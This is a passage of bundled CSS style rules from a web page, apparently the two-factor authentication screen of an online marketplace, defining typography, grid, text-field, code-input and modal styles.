Neue,sans-serif;font-size:42px;line-height:48px;font-weight:700}.bl-text--heading-42.bl-text--ellipsis__1{max-height:63px}.bl-text--heading-42.bl-text--ellipsis__2{max-height:126px}.bl-text--heading-42.bl-text--ellipsis__3{max-height:189px}.bl-text--display-60{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:60px;line-height:68px;font-weight:700}.bl-text--display-60.bl-text--ellipsis__1{max-height:90px}.bl-text--display-60.bl-text--ellipsis__2{max-height:180px}.bl-text--display-60.bl-text--ellipsis__3{max-height:270px}.bl-text--display-84{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:84px;line-height:88px;font-weight:700}.bl-text--display-84.bl-text--ellipsis__1{max-height:126px}.bl-text--display-84.bl-text--ellipsis__2{max-height:252px}.bl-text--display-84.bl-text--ellipsis__3{max-height:378px}.bl-text--display-100{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:100px;line-height:108px;font-weight:700}.bl-text--display-100.bl-text--ellipsis__1{max-height:150px}.bl-text--display-100.bl-text--ellipsis__2{max-height:300px}.bl-text--display-100.bl-text--ellipsis__3{max-height:450px}.bl-text--subheading-1{font-size:26px;line-height:1.23077}.bl-text--subheading-1.bl-text--ellipsis__1{max-height:39px}.bl-text--subheading-1.bl-text--ellipsis__2{max-height:78px}.bl-text--subheading-1.bl-text--ellipsis__3{max-height:117px}.bl-text--subheading-2{font-size:20px;line-height:1.2}.bl-text--subheading-2.bl-text--ellipsis__1{max-height:30px}.bl-text--subheading-2.bl-text--ellipsis__2{max-height:60px}.bl-text--subheading-2.bl-text--ellipsis__3{max-height:90px}.bl-text--subheading-3{font-size:18px;line-height:1.33333}.bl-text--subheading-3.bl-text--ellipsis__1{max-height:27px}.bl-text--subheading-3.bl-text--ellipsis__2{max-height:54px}.bl-text--subheading-3.bl-text--ellipsis__3{max-height:81px}.bl-text--body-default{font-size:16px;line-height:1.25}.bl-text--body-default.bl-text--ellipsis__1{max-height:24px}.bl-text--body-default.bl-text--ellipsis__2{max-height:48px}.bl-text--body-default.bl-text--ellipsis__3{max-height:72px}.bl-text--body-small{font-size:14px;line-height:1.46429}.bl-text--body-small.bl-text--ellipsis__1{max-height:21px}.bl-text--body-small.bl-text--ellipsis__2{max-height:42px}.bl-text--body-small.bl-text--ellipsis__3{max-height:63px}.bl-text--caption{font-size:13px;line-height:1.23077}.bl-text--caption.bl-text--ellipsis__1{max-height:19.5px}.bl-text--caption.bl-text--ellipsis__2{max-height:39px}.bl-text--caption.bl-text--ellipsis__3{max-height:58.5px}.bl-text--overline{font-size:11px;line-height:1.45455;letter-spacing:1.2px;text-transform:uppercase}.bl-text--overline.bl-text--ellipsis__1{max-height:16.5px}.bl-text--overline.bl-text--ellipsis__2{max-height:33px}.bl-text--overline.bl-text--ellipsis__3{max-height:49.5px}.bl-text.bl-text--ellipsis__1{-webkit-line-clamp:1}.bl-text.bl-text--ellipsis__2{-webkit-line-clamp:2}.bl-text.bl-text--ellipsis__3{-webkit-line-clamp:3}.bl-text.bl-text--ellipsis__1,.bl-text.bl-text--ellipsis__2,.bl-text.bl-text--ellipsis__3{overflow:hidden;-webkit-box-orient:vertical;display:-webkit-box}.bl-text--ellipsis__1{word-break:break-all}.bl-text--left{text-align:left}.bl-text--center{text-align:center}.bl-text--right{text-align:right}.bl-text--bold{font-weight:700}.bl-text--semi-bold{font-weight:600}.bl-text--medium{font-weight:500}.bl-text--regular{font-weight:400}.bl-text--disabled{cursor:not-allowed}.bl-text--uppercase{text-transform:uppercase}.bl-text--error{color:#e60505}.bl-text--line-through{text-decoration:line-through}.bl-text--link{display:inline;position:relative;cursor:pointer;text-decoration:none;outline:none}.bl-text--link:focus,.bl-text--link:hover{background-image:-moz-linear-gradient(left,currentColor,currentColor);background-image:linear-gradient(90deg,currentColor,currentColor);background-position:0 100%;background-repeat:no-repeat;background-size:100% 1px}.bl-text--link:active,.bl-text--link:focus{background-size:100% 2px}.bl-text--link-show-underline{background-image:-moz-linear-gradient(left,currentColor,currentColor);background-image:linear-gradient(90deg,currentColor,currentColor);background-position:0 100%;background-repeat:no-repeat;background-size:100% 1px}.bl-text--link-show-underline:active,.bl-text--link-show-underline:focus{background-size:100% 2px}.bl-text--link-contrast{color:#3a5fd6}.bl-text--link-hide-underline:focus,.bl-text--link-hide-underline:hover{background-image:none}.bl-text--link-inverse{color:#f2f2f2}</style>
  <style type="text/css">.bl-flex-container{display:-webkit-flex;display:-moz-box;display:flex}.bl-flex-container:not(:last-child){margin-bottom:1.5rem}.bl-flex-container:last-child{margin-bottom:0}.bl-flex-container.is-gutter-16{margin-left:-8px;margin-right:-8px;margin-top:-8px}.bl-flex-container.is-gutter-16>.bl-flex-item{padding:8px}.bl-flex-container.is-gutter-16:last-child{margin-bottom:-8px}.bl-flex-container.is-gutter-16:not(:last-child){margin-bottom:calc(1.5rem - 8px)}.bl-flex-container.is-gutter-20{margin-left:-10px;margin-right:-10px;margin-top:-10px}.bl-flex-container.is-gutter-20>.bl-flex-item{padding:10px}.bl-flex-container.is-gutter-20:last-child{margin-bottom:-10px}.bl-flex-container.is-gutter-20:not(:last-child){margin-bottom:calc(1.5rem - 10px)}.bl-flex-container.is-gutter-24{margin-left:-12px;margin-right:-12px;margin-top:-12px}.bl-flex-container.is-gutter-24>.bl-flex-item{padding:12px}.bl-flex-container.is-gutter-24:last-child{margin-bottom:-12px}.bl-flex-container.is-gutter-24:not(:last-child){margin-bottom:calc(1.5rem - 12px)}.bl-flex-container.is-gutter-32{margin-left:-16px;margin-right:-16px;margin-top:-16px}.bl-flex-container.is-gutter-32>.bl-flex-item{padding:16px}.bl-flex-container.is-gutter-32:last-child{margin-bottom:-16px}.bl-flex-container.is-gutter-32:not(:last-child){margin-bottom:calc(1.5rem - 16px)}</style>
  <style type="text/css">.bl-flex-item.is-col-0{width:0;-webkit-flex:1 0 0%;-moz-box-flex:1;flex:1 0 0%;max-width:0}.bl-flex-item.is-offset-0{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:0}.bl-flex-item.is-col-1{width:8.33333%;-webkit-flex:1 0 8.33333%;-moz-box-flex:1;flex:1 0 8.33333%;max-width:8.33333%}.bl-flex-item.is-offset-1{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:8.33333%}.bl-flex-item.is-col-2{width:16.66667%;-webkit-flex:1 0 16.66667%;-moz-box-flex:1;flex:1 0 16.66667%;max-width:16.66667%}.bl-flex-item.is-offset-2{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:16.66667%}.bl-flex-item.is-col-3{width:25%;-webkit-flex:1 0 25%;-moz-box-flex:1;flex:1 0 25%;max-width:25%}.bl-flex-item.is-offset-3{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:25%}.bl-flex-item.is-col-4{width:33.33333%;-webkit-flex:1 0 33.33333%;-moz-box-flex:1;flex:1 0 33.33333%;max-width:33.33333%}.bl-flex-item.is-offset-4{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:33.33333%}.bl-flex-item.is-col-5{width:41.66667%;-webkit-flex:1 0 41.66667%;-moz-box-flex:1;flex:1 0 41.66667%;max-width:41.66667%}.bl-flex-item.is-offset-5{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:41.66667%}.bl-flex-item.is-col-6{width:50%;-webkit-flex:1 0 50%;-moz-box-flex:1;flex:1 0 50%;max-width:50%}.bl-flex-item.is-offset-6{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:50%}.bl-flex-item.is-col-7{width:58.33333%;-webkit-flex:1 0 58.33333%;-moz-box-flex:1;flex:1 0 58.33333%;max-width:58.33333%}.bl-flex-item.is-offset-7{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:58.33333%}.bl-flex-item.is-col-8{width:66.66667%;-webkit-flex:1 0 66.66667%;-moz-box-flex:1;flex:1 0 66.66667%;max-width:66.66667%}.bl-flex-item.is-offset-8{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:66.66667%}.bl-flex-item.is-col-9{width:75%;-webkit-flex:1 0 75%;-moz-box-flex:1;flex:1 0 75%;max-width:75%}.bl-flex-item.is-offset-9{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:75%}.bl-flex-item.is-col-10{width:83.33333%;-webkit-flex:1 0 83.33333%;-moz-box-flex:1;flex:1 0 83.33333%;max-width:83.33333%}.bl-flex-item.is-offset-10{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:83.33333%}.bl-flex-item.is-col-11{width:91.66667%;-webkit-flex:1 0 91.66667%;-moz-box-flex:1;flex:1 0 91.66667%;max-width:91.66667%}.bl-flex-item.is-offset-11{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:91.66667%}.bl-flex-item.is-col-12{width:100%;-webkit-flex:1 0 100%;-moz-box-flex:1;flex:1 0 100%;max-width:100%}.bl-flex-item.is-offset-12{-webkit-flex-basis:0;flex-basis:0;-webkit-flex-grow:1;-moz-box-flex:1;flex-grow:1;margin-left:100%}</style>
  <style type="text/css">
.card-wrapper[data-v-145097c4] {
  padding: 17px 20px;
  border-bottom: 1px solid #E0E0E0;
  border-right: 1px solid #E0E0E0;
  border-left: 1px solid #E0E0E0;
  margin-bottom: 0;
  cursor: pointer;
}
.card-wrapper[data-v-145097c4]:first-child {
  border-top: 1px solid #E0E0E0;
}
.disabled[data-v-145097c4] {
  cursor: not-allowed;
  opacity: 0.4;
}

</style>
  <style type="text/css">.bl-link{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;display:inline;position:relative;color:inherit;font-size:inherit;font-weight:inherit;cursor:pointer;text-decoration:none;outline:none}.bl-link:focus,.bl-link:hover{background-image:-moz-linear-gradient(left,currentColor,currentColor);background-image:linear-gradient(90deg,currentColor,currentColor);background-position:0 100%;background-repeat:no-repeat;background-size:100% 1px}.bl-link:active,.bl-link:focus{background-size:100% 2px}.bl-link.is-disabled{color:#b6b6b6;pointer-events:none;cursor:not-allowed}.bl-link.is-bold{font-weight:600}.bl-link.is-show-underline{background-image:-moz-linear-gradient(left,currentColor,currentColor);background-image:linear-gradient(90deg,currentColor,currentColor);background-position:0 100%;background-repeat:no-repeat;background-size:100% 1px}.bl-link.is-show-underline:active,.bl-link.is-show-underline:focus{background-size:100% 2px}.bl-link.is-contrast{color:#2b4ac7}.bl-link.is-hide-underline{background-image:none}</style>
  <style type="text/css">
.illust[data-v-c31df8d0] {
  width: 64px;
  height: 64px;
  background-size: cover;
  background-repeat: no-repeat;
}
.other-method-wrapper[data-v-c31df8d0] {
  padding: 12px 20px;
  border: 1px solid #E0E0E0;
  margin-bottom: 0;
  cursor: pointer;
  margin-bottom: 0 !important;
}
.tfa-method-wrapper[data-v-c31df8d0] {
  min-height: 500px;
}

</style>
  <style type="text/css">.bl-text-field{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;position:relative;display:inline-block;width:100%;max-width:100%;font-size:16px}.bl-text-field:before{content:"";border:1px solid #d6d6d6;border-radius:4px;position:absolute;top:0;width:100%;height:52px;display:block;-moz-transition:border,border-width .08s cubic-bezier(.55,.085,.68,.53);transition:border,border-width .08s cubic-bezier(.55,.085,.68,.53)}.bl-text-field__boxed{background:#fff;border-radius:4px;display:-webkit-inline-flex;display:-moz-inline-box;display:inline-flex;width:inherit;height:52px;cursor:text}.bl-text-field__boxed,.bl-text-field__inner{-webkit-align-items:center;-moz-box-align:center;align-items:center}.bl-text-field__inner{position:relative;display:-webkit-flex;display:-moz-box;display:flex;height:100%;margin:0 12px;width:100%}.bl-text-field__input{border:none;display:block;font-family:inherit;margin:20px 0 0;width:100%;background:none;text-align:left;color:#141414;font-size:inherit;min-height:auto;padding:0;-moz-appearance:textfield}.bl-text-field__input::-webkit-inner-spin-button,.bl-text-field__input::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}.bl-text-field__input::-webkit-credentials-auto-fill-button{visibility:hidden}.bl-text-field__input::-webkit-input-placeholder{color:#8d8d8d}.bl-text-field__input:-moz-placeholder,.bl-text-field__input::-moz-placeholder{color:#8d8d8d}.bl-text-field__input:-ms-input-placeholder{color:#8d8d8d}.bl-text-field__input::-ms-input-placeholder{color:#8d8d8d}.bl-text-field__input::placeholder{color:#8d8d8d}.bl-text-field__input:focus{outline:none;box-shadow:none}.bl-text-field__label{color:#8d8d8d;font-size:16px;display:block;position:absolute;top:16px;overflow:hidden;white-space:nowrap;pointer-events:none;height:20px;line-height:20px;-moz-transition:.3s cubic-bezier(.25,.8,.5,1);transition:.3s cubic-bezier(.25,.8,.5,1)}.bl-text-field__message{margin-top:4px;margin-right:8px;display:-webkit-flex;display:-moz-box;display:flex;-webkit-align-items:flex-start;-moz-box-align:start;align-items:flex-start}.bl-text-field__message svg{width:13px!important;height:13px!important;margin-top:1px;margin-right:4px;-webkit-flex-shrink:0;flex-shrink:0}.bl-text-field__counter{-webkit-flex-shrink:0;flex-shrink:0;margin-top:4px}.bl-text-field__counter.is-invisible{display:none}.bl-text-field__prefix,.bl-text-field__suffix{display:-webkit-inline-flex;display:-moz-inline-box;display:inline-flex}.bl-text-field__prefix svg,.bl-text-field__suffix svg{width:20px;height:20px}.bl-text-field__prefix{margin-left:12px;margin-right:-4px}.bl-text-field__suffix{z-index:1;margin-right:12px}.bl-text-field__append,.bl-text-field__prepend{color:#8d8d8d;z-index:1}.bl-text-field__prepend{margin-left:12px}.bl-text-field__append{margin-right:12px}.bl-text-field.has-value .bl-text-field__label,.bl-text-field.is-focused .bl-text-field__label{top:8px;font-size:12px;height:16px;line-height:16px}.bl-text-field.is-focused:before{border:2px solid #2b4ac7}.bl-text-field.is-error:before{border:2px solid #ec0c0c}.bl-text-field.is-disabled:before{border-color:#d6d6d6;background:#f2f2f2}.bl-text-field.is-disabled .bl-text-field__input{color:#8d8d8d}.bl-text-field.is-disabled .bl-text-field__label{color:#b6b6b6}.bl-text-field.is-disabled .bl-text-field__boxed{cursor:not-allowed}.bl-text-field.is-disabled .bl-text-field__append,.bl-text-field.is-disabled .bl-text-field__prepend{color:#d6d6d6}.bl-text-field--inline .bl-text-field__label{display:none}.bl-text-field--inline .bl-text-field__input{margin-top:0}.bl-text-field--inline.bl-text-field--small{font-size:14px}.bl-text-field--inline.bl-text-field--small .bl-text-field__boxed,.bl-text-field--inline.bl-text-field--small:before{height:32px}.bl-text-field--inline.bl-text-field--small .bl-text-field__input{letter-spacing:.18px}.bl-text-field--inline.bl-text-field--small .bl-text-field__inner{margin:0 8px}.bl-text-field--inline.bl-text-field--small .bl-text-field__prepend{margin-left:8px;margin-right:-4px}.bl-text-field--inline.bl-text-field--small .bl-text-field__append{margin-right:8px;margin-left:-4px}.bl-text{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:16px;line-height:1.25;color:#141414;margin:0}.bl-text.bl-text--ellipsis__1{max-height:24px}.bl-text.bl-text--ellipsis__2{max-height:48px}.bl-text.bl-text--ellipsis__3{max-height:72px}.bl-text--primary{color:#141414}.bl-text--secondary{color:#3d3d3d}.bl-text--subdued{color:#8d8d8d}.bl-text--disabled{color:#b6b6b6}.bl-text--inverse{color:#fff}.bl-text--highlight-01{color:#d1083a}.bl-text--informational-01{color:#0e1a4d}.bl-text--informational-02{color:#3a5fd6}.bl-text--success-01{color:#01271c}.bl-text--success-02{color:#128c55}.bl-text--warning-01{color:#bf4400}.bl-text--warning-02{color:#4d2309}.bl-text--error-01{color:#e60505}.bl-text--error-02{color:#7a0602}.bl-text--attention-01{color:#332205}.bl-text--link-01{color:#2b4ac7}.bl-text--link-01-disabled,.bl-text--link-01-inverse{color:#8badf0}.bl-text--caption-08{font-size:8px;line-height:12px;font-weight:500}.bl-text--caption-08.bl-text--ellipsis__1{max-height:12px}.bl-text--caption-08.bl-text--ellipsis__2{max-height:24px}.bl-text--caption-08.bl-text--ellipsis__3{max-height:36px}.bl-text--caption-10{font-size:10px;line-height:12px}.bl-text--caption-10.bl-text--ellipsis__1{max-height:15px}.bl-text--caption-10.bl-text--ellipsis__2{max-height:30px}.bl-text--caption-10.bl-text--ellipsis__3{max-height:45px}.bl-text--caption-12{font-size:12px;line-height:16px}.bl-text--caption-12.bl-text--ellipsis__1{max-height:18px}.bl-text--caption-12.bl-text--ellipsis__2{max-height:36px}.bl-text--caption-12.bl-text--ellipsis__3{max-height:54px}.bl-text--body-14{font-size:14px;line-height:20px}.bl-text--body-14.bl-text--ellipsis__1{max-height:21px}.bl-text--body-14.bl-text--ellipsis__2{max-height:42px}.bl-text--body-14.bl-text--ellipsis__3{max-height:63px}.bl-text--body-long-14{font-size:14px;line-height:22px}.bl-text--body-long-14.bl-text--ellipsis__1{max-height:21px}.bl-text--body-long-14.bl-text--ellipsis__2{max-height:42px}.bl-text--body-long-14.bl-text--ellipsis__3{max-height:63px}.bl-text--body-16{font-size:16px;line-height:20px}.bl-text--body-16.bl-text--ellipsis__1{max-height:24px}.bl-text--body-16.bl-text--ellipsis__2{max-height:48px}.bl-text--body-16.bl-text--ellipsis__3{max-height:72px}.bl-text--body-long-16{font-size:16px;line-height:24px}.bl-text--body-long-16.bl-text--ellipsis__1{max-height:24px}.bl-text--body-long-16.bl-text--ellipsis__2{max-height:48px}.bl-text--body-long-16.bl-text--ellipsis__3{max-height:72px}.bl-text--subheading-18{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:18px;line-height:22px;font-weight:500}.bl-text--subheading-18.bl-text--ellipsis__1{max-height:27px}.bl-text--subheading-18.bl-text--ellipsis__2{max-height:54px}.bl-text--subheading-18.bl-text--ellipsis__3{max-height:81px}.bl-text--subheading-20{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:20px;line-height:26px;font-weight:500}.bl-text--subheading-20.bl-text--ellipsis__1{max-height:30px}.bl-text--subheading-20.bl-text--ellipsis__2{max-height:60px}.bl-text--subheading-20.bl-text--ellipsis__3{max-height:90px}.bl-text--heading-24{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:24px;line-height:28px;font-weight:700}.bl-text--heading-24.bl-text--ellipsis__1{max-height:36px}.bl-text--heading-24.bl-text--ellipsis__2{max-height:72px}.bl-text--heading-24.bl-text--ellipsis__3{max-height:108px}.bl-text--heading-28{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:28px;line-height:34px;font-weight:700}.bl-text--heading-28.bl-text--ellipsis__1{max-height:42px}.bl-text--heading-28.bl-text--ellipsis__2{max-height:84px}.bl-text--heading-28.bl-text--ellipsis__3{max-height:126px}.bl-text--heading-32{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:32px;line-height:36px;font-weight:700}.bl-text--heading-32.bl-text--ellipsis__1{max-height:48px}.bl-text--heading-32.bl-text--ellipsis__2{max-height:96px}.bl-text--heading-32.bl-text--ellipsis__3{max-height:144px}.bl-text--heading-42{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:42px;line-height:48px;font-weight:700}.bl-text--heading-42.bl-text--ellipsis__1{max-height:63px}.bl-text--heading-42.bl-text--ellipsis__2{max-height:126px}.bl-text--heading-42.bl-text--ellipsis__3{max-height:189px}.bl-text--display-60{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:60px;line-height:68px;font-weight:700}.bl-text--display-60.bl-text--ellipsis__1{max-height:90px}.bl-text--display-60.bl-text--ellipsis__2{max-height:180px}.bl-text--display-60.bl-text--ellipsis__3{max-height:270px}.bl-text--display-84{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:84px;line-height:88px;font-weight:700}.bl-text--display-84.bl-text--ellipsis__1{max-height:126px}.bl-text--display-84.bl-text--ellipsis__2{max-height:252px}.bl-text--display-84.bl-text--ellipsis__3{max-height:378px}.bl-text--display-100{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:100px;line-height:108px;font-weight:700}.bl-text--display-100.bl-text--ellipsis__1{max-height:150px}.bl-text--display-100.bl-text--ellipsis__2{max-height:300px}.bl-text--display-100.bl-text--ellipsis__3{max-height:450px}.bl-text--subheading-1{font-size:26px;line-height:1.23077}.bl-text--subheading-1.bl-text--ellipsis__1{max-height:39px}.bl-text--subheading-1.bl-text--ellipsis__2{max-height:78px}.bl-text--subheading-1.bl-text--ellipsis__3{max-height:117px}.bl-text--subheading-2{font-size:20px;line-height:1.2}.bl-text--subheading-2.bl-text--ellipsis__1{max-height:30px}.bl-text--subheading-2.bl-text--ellipsis__2{max-height:60px}.bl-text--subheading-2.bl-text--ellipsis__3{max-height:90px}.bl-text--subheading-3{font-size:18px;line-height:1.33333}.bl-text--subheading-3.bl-text--ellipsis__1{max-height:27px}.bl-text--subheading-3.bl-text--ellipsis__2{max-height:54px}.bl-text--subheading-3.bl-text--ellipsis__3{max-height:81px}.bl-text--body-default{font-size:16px;line-height:1.25}.bl-text--body-default.bl-text--ellipsis__1{max-height:24px}.bl-text--body-default.bl-text--ellipsis__2{max-height:48px}.bl-text--body-default.bl-text--ellipsis__3{max-height:72px}.bl-text--body-small{font-size:14px;line-height:1.46429}.bl-text--body-small.bl-text--ellipsis__1{max-height:21px}.bl-text--body-small.bl-text--ellipsis__2{max-height:42px}.bl-text--body-small.bl-text--ellipsis__3{max-height:63px}.bl-text--caption{font-size:13px;line-height:1.23077}.bl-text--caption.bl-text--ellipsis__1{max-height:19.5px}.bl-text--caption.bl-text--ellipsis__2{max-height:39px}.bl-text--caption.bl-text--ellipsis__3{max-height:58.5px}.bl-text--overline{font-size:11px;line-height:1.45455;letter-spacing:1.2px;text-transform:uppercase}.bl-text--overline.bl-text--ellipsis__1{max-height:16.5px}.bl-text--overline.bl-text--ellipsis__2{max-height:33px}.bl-text--overline.bl-text--ellipsis__3{max-height:49.5px}.bl-text.bl-text--ellipsis__1{-webkit-line-clamp:1}.bl-text.bl-text--ellipsis__2{-webkit-line-clamp:2}.bl-text.bl-text--ellipsis__3{-webkit-line-clamp:3}.bl-text.bl-text--ellipsis__1,.bl-text.bl-text--ellipsis__2,.bl-text.bl-text--ellipsis__3{overflow:hidden;-webkit-box-orient:vertical;display:-webkit-box}.bl-text--ellipsis__1{word-break:break-all}.bl-text--left{text-align:left}.bl-text--center{text-align:center}.bl-text--right{text-align:right}.bl-text--bold{font-weight:700}.bl-text--semi-bold{font-weight:600}.bl-text--medium{font-weight:500}.bl-text--regular{font-weight:400}.bl-text--disabled{cursor:not-allowed}.bl-text--uppercase{text-transform:uppercase}.bl-text--error{color:#e60505}.bl-text--line-through{text-decoration:line-through}.bl-text--link{display:inline;position:relative;cursor:pointer;text-decoration:none;outline:none}.bl-text--link:focus,.bl-text--link:hover{background-image:-moz-linear-gradient(left,currentColor,currentColor);background-image:linear-gradient(90deg,currentColor,currentColor);background-position:0 100%;background-repeat:no-repeat;background-size:100% 1px}.bl-text--link:active,.bl-text--link:focus{background-size:100% 2px}.bl-text--link-show-underline{background-image:-moz-linear-gradient(left,currentColor,currentColor);background-image:linear-gradient(90deg,currentColor,currentColor);background-position:0 100%;background-repeat:no-repeat;background-size:100% 1px}.bl-text--link-show-underline:active,.bl-text--link-show-underline:focus{background-size:100% 2px}.bl-text--link-contrast{color:#3a5fd6}.bl-text--link-hide-underline:focus,.bl-text--link-hide-underline:hover{background-image:none}.bl-text--link-inverse{color:#f2f2f2}</style>
  <style type="text/css">
.code-input__item {
  width: 55px !important;
  height: 44px !important;
  font-size: 20px !important;
  margin-right: 10px;
  text-align: center !important;
}
.code-input__item input[type="text"] {
  text-align: center !important;
}
.code-input__item:last-child {
  margin-right: 0;
}
.code-input__item .bl-text-field__boxed .bl-text-field__input {
  text-align: center !important;
  margin-top: 0 !important;
}
</style>
  <style type="text/css">
.edit-icon[data-v-96e27eba] {
  display: inline-block;
  width: 16px;
  height: 16px;
  cursor: pointer;
  background-image: url("https://s3.bukalapak.com/attachment/827212/tfa-js__icon-edit.png");
  vertical-align: top;
}
</style>
  <style type="text/css">
.other-button-disabled[data-v-f50f7418] {
  opacity: 0.5;
  pointer-events: none;
}
.edit-icon[data-v-f50f7418] {
  display: inline-block;
  width: 16px;
  height: 16px;
  cursor: pointer;
  background-image: url("https://s3.bukalapak.com/attachment/827212/tfa-js__icon-edit.png");
  vertical-align: top;
}
</style>
  <style type="text/css">
.illust-double[data-v-22a9fcde] {
  background-size: cover;
  background-repeat: no-repeat;
  width: 64px;
  height: 64px;
}
.illust-single[data-v-22a9fcde] {
  background-size: cover;
  background-repeat: no-repeat;
  width: 200px;
  height: 124px;
}
</style>
  <style type="text/css">.tfa-js .bl-link{font-family:Hind Madurai,sans-serif;display:inline;position:relative;color:inherit;font-size:inherit;font-weight:inherit;cursor:pointer;text-decoration:none;outline:none}.tfa-js .bl-link:focus,.tfa-js .bl-link:hover{background-image:-webkit-gradient(linear,left top,right top,from(currentColor),to(currentColor));background-image:linear-gradient(90deg,currentColor,currentColor);background-position:0 1.25em;background-repeat:no-repeat;background-size:100% 1px}.tfa-js .bl-link:active,.tfa-js .bl-link:focus{background-size:100% 2px}.tfa-js .bl-link.is-disabled{color:#d6d6d6;pointer-events:none;cursor:not-allowed}.tfa-js .bl-link.is-bold{font-weight:600}.tfa-js .bl-link.is-show-underline{background-image:-webkit-gradient(linear,left top,right top,from(currentColor),to(currentColor));background-image:linear-gradient(90deg,currentColor,currentColor);background-position:0 1.25em;background-repeat:no-repeat;background-size:100% 1px}.tfa-js .bl-link.is-show-underline:active,.tfa-js .bl-link.is-show-underline:focus{background-size:100% 2px}.tfa-js .bl-link.is-contrast{color:#3a5fd6}.tfa-js .bl-link.is-hide-underline{background-image:none}.tfa-js .bl-overlay{position:fixed;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;z-index:9999}.tfa-js .bl-overlay,.tfa-js .bl-overlay__scrim{border-radius:inherit;top:0;bottom:0;left:0;right:0}.tfa-js .bl-overlay__scrim{position:absolute;background:#3d3d3d;opacity:.7;height:100%;-webkit-transition:inherit;transition:inherit;width:100%;will-change:opacity}.tfa-js .bl-overlay__content{position:relative}.tfa-js .bl-overlay-transition-enter-active,.tfa-js .bl-overlay-transition-leave-active{-webkit-transition:opacity .2s cubic-bezier(.77,0,.17,1);transition:opacity .2s cubic-bezier(.77,0,.17,1)}.tfa-js .bl-overlay-transition-enter,.tfa-js .bl-overlay-transition-leave-to{opacity:0}.tfa-js .bl-modal{position:fixed;z-index:9999;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;top:0;height:100%;width:100%;left:0;right:0}.tfa-js .bl-modal__wrapper{width:100%;position:relative;z-index:9999}.tfa-js .bl-modal__header{display:block}.tfa-js .bl-modal__body{max-height:calc(100vh - 200px);overflow-y:auto;display:block}.tfa-js .bl-modal__footer{text-align:right}.tfa-js .bl-modal-transition-enter-active,.tfa-js .bl-modal-transition-leave-active{-webkit-transition:opacity .2s cubic-bezier(.45,.03,.51,.96);transition:opacity .2s cubic-bezier(.45,.03,.51,.96)}.tfa-js .bl-modal-transition-enter,.tfa-js .bl-modal-transition-leave-to{opacity:0}.tfa-js .bl-separator{display:-webkit-box;display:-ms-flexbox;display:flex;position:relative;min-height:1px}.tfa-js 